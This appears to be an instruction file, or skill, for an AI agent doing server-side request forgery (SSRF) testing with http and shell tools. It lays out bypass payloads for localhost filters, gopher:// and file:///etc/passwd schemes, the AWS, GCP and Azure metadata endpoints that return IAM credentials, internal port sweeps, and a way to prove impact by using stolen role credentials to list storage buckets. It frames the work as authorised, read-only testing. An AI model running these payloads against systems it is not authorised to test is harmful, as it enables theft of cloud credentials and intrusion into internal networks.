---
name: ssrf
description: Deep-dive SSRF testing — bypass filters, hit cloud metadata, chain to RCE/credential disclosure. Use when a target parameter clearly accepts a URL or hostname.
allowed-tools:
  - http
  - shell
  - file_write
---

# SSRF playbook

You suspect a parameter is being fetched server-side. Confirm it, escalate it, prove impact.

Execution rule: use the actual parameter, callback host, and target URL before running commands. Never write literal placeholders such as `<endpoint>` or `<role>` to files; if the collaborator/canary host is missing, ask once.

## 1. Confirm the primitive
Send the `http` request with the parameter pointing to:
- An out-of-band canary the user provides (interactsh / burp collaborator / a netcat listener they own)
- Compare to a control value to confirm the server is doing the fetch

If the canary fires, you have at minimum a blind SSRF.

## 2. Map filter behavior
Probe how the server validates the URL. For each probe, capture status and body:
- `http://127.0.0.1`, `http://localhost`, `http://0.0.0.0`
- IPv6: `http://[::1]`, `http://[::ffff:127.0.0.1]`
- Decimal/octal: `http://2130706433`, `http://0177.0.0.1`
- DNS rebinding hosts the user provides
- Schemes: `gopher://`, `file:///etc/passwd`, `dict://`, `ftp://`
- Redirect chain: a user-controlled URL that 302s to internal target

Group probes by outcome to fingerprint the parser (Python urllib? Java URL? curl? net/http?).

## 3. Hit cloud metadata
If you suspect AWS:
```
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
```
If IMDSv2 is enforced, attempt to obtain the token via the same SSRF if the primitive supports headers.

For GCP: `http://metadata.google.internal/computeMetadata/v1/` with `Metadata-Flavor: Google`.
For Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` with `Metadata: true`.

## 4. Internal service discovery
With the SSRF confirmed, sweep common internal ports/paths from the victim's perspective: `:80`, `:443`, `:6379` (Redis), `:9200` (Elastic), `:8500` (Consul), `:2375` (Docker), `:25` (SMTP). Use response time + body fingerprint.

## 5. Prove impact
- Stolen credentials → demonstrate by listing one S3 bucket / one GCS bucket the role can reach (read-only).
- Internal admin panel → fetch a single page that's clearly internal.
- Source code / config disclosure → grab one file via `file://` or internal HTTP.

Write a report to `findings/ssrf-<endpoint>.md` with the exact request, the exact response, and the impact you proved. Stop there.
